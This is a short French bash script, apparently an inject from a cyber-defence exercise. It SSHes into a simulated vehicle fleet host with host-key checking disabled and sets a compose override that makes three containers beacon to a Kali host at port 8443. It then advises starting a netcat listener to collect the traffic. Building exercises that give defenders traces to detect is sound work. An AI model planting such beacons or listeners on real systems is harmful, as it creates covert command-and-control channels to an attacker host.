#!/usr/bin/env bash
# INJECT B3 - active la balise (heartbeat) de la navlib de demo sur les vehicules.
# On injecte la variable NAVLIB_PING dans les conteneurs puis on redemarre.
# Trace attendue : flux sortants reguliers VEHICULES-SIM -> KALI:8443 dans OPNsense.
set -euo pipefail
: "${IP_VEH:?}"; : "${IP_KALI:?}"
echo "[B3] Activation de la balise vers http://$IP_KALI:8443/update"
ssh -o StrictHostKeyChecking=no "localuser@$IP_VEH" bash -s <<REMOTE
set -e
cd /opt/citybot/flotte-sim
for c in veh-001 veh-002 veh-003; do
  sudo docker exec \$c sh -c 'echo ok' >/dev/null 2>&1 || continue
done
# Ajout de la variable d'env et redemarrage via compose override
sudo tee docker-compose.override.yml >/dev/null <<OV
services:
  veh-001: { environment: { NAVLIB_PING: "http://$IP_KALI:8443/update" } }
  veh-002: { environment: { NAVLIB_PING: "http://$IP_KALI:8443/update" } }
  veh-003: { environment: { NAVLIB_PING: "http://$IP_KALI:8443/update" } }
OV
sudo docker compose up -d
REMOTE
echo "[B3] Balise active. Lancer le collecteur : nc -lk -p 8443 ou le listener fourni."
